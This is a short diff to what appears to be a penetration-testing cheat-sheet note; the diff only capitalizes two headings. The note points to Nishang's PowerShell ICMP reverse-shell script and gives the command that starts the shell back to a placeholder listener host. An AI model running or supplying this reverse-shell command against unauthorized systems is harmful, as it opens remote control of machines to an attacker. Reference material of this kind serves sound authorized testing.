@@ -1,7 +1,7 @@
-### source
+### Source
 https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellIcmp.ps1  
 
-### start client side
+### Start client side
 ```
 Invoke-PowerShellIcmp -IPAddress <lhost>
 ```
